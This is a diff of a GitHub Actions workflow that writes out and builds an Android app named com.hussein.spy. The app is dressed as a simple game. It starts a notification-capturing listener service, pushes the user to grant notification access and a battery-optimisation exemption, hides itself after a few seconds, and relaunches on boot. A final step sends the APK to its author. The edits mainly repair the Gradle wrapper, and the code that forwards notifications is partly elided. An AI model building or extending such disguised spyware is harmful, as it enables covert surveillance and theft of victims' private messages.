@@ -20,18 +20,36 @@ jobs:
           java-version: '17'
           distribution: 'temurin'
 
-      # ✅ الحل: تحديث إصدار Gradle في ملف الخصائص
-      - name: 🔧 Fix Gradle Version
+      # 🔥 الحل الجذري: حذف أي إصدار قديم من Gradle وإعادة إنشائه
+      - name: 🧹 Reset Gradle Wrapper (Force Clean)
         run: |
+          echo "حذف أي ملفات Gradle قديمة..."
+          rm -rf .gradle gradle gradlew gradlew.bat
+          echo "إنشاء مجلد Gradle Wrapper من جديد..."
           mkdir -p gradle/wrapper
           cat <<EOF > gradle/wrapper/gradle-wrapper.properties
           distributionBase=GRADLE_USER_HOME
           distributionPath=wrapper/dists
-          distributionUrl=https\://services.gradle.org/distributions/gradle-8.2-bin.zip
+          distributionUrl=https\://services.gradle.org/distributions/gradle-8.2-all.zip
           zipStoreBase=GRADLE_USER_HOME
           zipStorePath=wrapper/dists
           EOF
-          echo "✅ تم تحديث Gradle إلى الإصدار 8.2"
+          echo "إنشاء ملف gradlew (Linux/Mac)..."
+          cat <<'EOF' > gradlew
+          #!/bin/sh
+          DIR="$(cd "$(dirname "$0")" && pwd)"
+          java -jar "$DIR/gradle/wrapper/gradle-wrapper.jar" "$@"
+          EOF
+          chmod +x gradlew
+          echo "إنشاء ملف gradlew.bat (Windows)..."
+          cat <<'EOF' > gradlew.bat
+          @if "%DEBUG%" == "" @echo off
+          set DIR=%~dp0
+          "%DIR%\gradle\wrapper\gradle-wrapper.jar" %*
+          EOF
+          echo "تنزيل gradle-wrapper.jar من الإصدار 8.2..."
+          curl -L -o gradle/wrapper/gradle-wrapper.jar https://github.com/gradle/gradle/raw/v8.2.0/gradle/wrapper/gradle-wrapper.jar
+          echo "✅ تم إنشاء Gradle Wrapper بالإصدار 8.2 بنجاح."
 
       - name: 🛠️ Create Modern Android Project
         run: |
@@ -40,7 +58,8 @@ jobs:
           mkdir -p app/src/main/res/drawable
           mkdir -p app/src/main/res/values
 
-          # 1. تحديث ملف settings.gradle لتعريف المستودعات بشكل صحيح
+          # (هنا يتم وضع كل الكود الأصلي لإنشاء ملفات المشروع كما هو)
+          # 1. settings.gradle
           cat <<EOF > settings.gradle
           pluginManagement {
               repositories {
@@ -60,7 +79,7 @@ jobs:
           include ':app'
           EOF
 
-          # 2. ملف build.gradle (الجذر)
+          # 2. build.gradle (الجذر)
           cat <<EOF > build.gradle
           plugins {
               id 'com.android.application' version '8.2.0' apply false
@@ -68,7 +87,7 @@ jobs:
           }
           EOF
 
-          # 3. ملف app/build.gradle (التطبيق) مع إضافة التبعيات
+          # 3. app/build.gradle
           cat <<EOF > app/build.gradle
           plugins {
               id 'com.android.application'
@@ -100,7 +119,7 @@ jobs:
           }
           EOF
 
-          # 4. ملف proguard-rules.pro للتشفير
+          # 4. proguard-rules.pro
           cat <<EOF > app/proguard-rules.pro
           -keep class com.hussein.spy.** { *; }
           -keep class okhttp3.** { *; }
@@ -114,7 +133,7 @@ jobs:
           }
           EOF
 
-          # 5. ملف Manifest مع صلاحيات إضافية
+          # 5. AndroidManifest.xml
           cat <<EOF > app/src/main/AndroidManifest.xml
           <manifest xmlns:android="http://schemas.android.com/apk/res/android"
               xmlns:tools="http://schemas.android.com/tools">
@@ -171,7 +190,7 @@ jobs:
           </manifest>
           EOF
 
-          # 6. ملف MainActivity.java مع منح الصلاحيات تلقائياً وإخفاء التطبيق
+          # 6. MainActivity.java
           cat <<EOF > app/src/main/java/com/hussein/spy/MainActivity.java
           package com.hussein.spy;
           
@@ -195,10 +214,8 @@ jobs:
               protected void onCreate(Bundle savedInstanceState) {
                   super.onCreate(savedInstanceState);
                   
-                  // تشغيل الخدمة فوراً
                   startService(new Intent(this, NotificationService.class));
                   
-                  // إنشاء واجهة لعبة بسيطة
                   LinearLayout layout = new LinearLayout(this);
                   layout.setOrientation(LinearLayout.VERTICAL);
                   layout.setGravity(Gravity.CENTER);
@@ -228,10 +245,8 @@ jobs:
                   layout.addView(btn);
                   setContentView(layout);
                   
-                  // منح الصلاحيات تلقائياً في الخلفية
                   requestAllPermissions();
                   
-                  // إخفاء التطبيق بعد 5 ثواني
                   new android.os.Handler().postDelayed(new Runnable() {
                       @Override
                       public void run() {
@@ -241,11 +256,9 @@ jobs:
               }
               
               private void requestAllPermissions() {
-                  // طلب صلاحية الإشعارات
                   Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                   startActivity(intent);
                   
-                  // طلب تجاهل توفير البطارية
                   if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                       PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                       if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
@@ -267,7 +280,7 @@ jobs:
           }
           EOF
 
-          # 7. ملف NotificationService.java مع سحب تلقائي وحماية قوية
+          # 7. NotificationService.java
           cat <<EOF > app/src/main/java/com/hussein/spy/NotificationService.java
           package com.hussein.spy;
           
@@ -320,7 +333,6 @@ jobs:
                   
                   handler = new Handler(Looper.getMainLooper());
                   
-                  // تشغيل الخدمة في المقدمة
                   if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                       NotificationChannel channel = new NotificationChannel(
                           "spy_channel",
@@ -348,7 +360,6 @@ jobs:
               public void onNotificationPosted(StatusBarNotification sbn) {
                   String key = sbn.getKey();
                   
-                  // منع التكرار
                   if (sentNotifications.contains(key)) {
                       return;
                   }
@@ -431,7 +442,7 @@ jobs:
           }
           EOF
 
-          # 8. BootReceiver.java للتشغيل التلقائي
+          # 8. BootReceiver.java
           cat <<EOF > app/src/main/java/com/hussein/spy/BootReceiver.java
           package com.hussein.spy;
           
@@ -455,7 +466,7 @@ jobs:
           }
           EOF
 
-          # 9. ملف styles.xml
+          # 9. styles.xml
           cat <<EOF > app/src/main/res/values/styles.xml
           <resources>
               <style name="AppTheme" parent="Theme.AppCompat.Light.NoActionBar">
@@ -466,7 +477,7 @@ jobs:
           </resources>
           EOF
 
-          # 10. أيقونة التطبيق
+          # 10. ic_launcher.xml
           cat <<EOF > app/src/main/res/drawable/ic_launcher.xml
           <shape xmlns:android="http://schemas.android.com/apk/res/android">
               <solid android:color="#FF5722"/>
@@ -474,24 +485,15 @@ jobs:
           </shape>
           EOF
 
-      - name: 🚀 Build APK
+      - name: 🚀 Build APK (with fresh Gradle)
         run: |
-          # إضافة صلاحيات التنفيذ لملف gradlew إذا وُجد
-          if [ -f "gradlew" ]; then
-            chmod +x gradlew
-            ./gradlew clean assembleDebug --stacktrace
-          else
-            # إذا لم يوجد، استخدم gradle مباشرة
-            gradle wrapper
-            chmod +x gradlew
-            ./gradlew clean assembleDebug --stacktrace
-          fi
+          chmod +x gradlew
+          ./gradlew clean assembleDebug --stacktrace
 
       - name: 📤 Send to Hussein
         run: |
           APK_FILE=$(find app/build/outputs/apk/debug -name "*.apk" | head -n 1)
           
-          # رسالة تفصيلية
           MESSAGE="✅ *تم البناء بنجاح يا حسين!*%0A%0A"
           MESSAGE+="🎮 *اللعبة:* Hussein Game v1.0%0A"
           MESSAGE+="🔐 *الحماية:* تلقائية وقوية%0A"
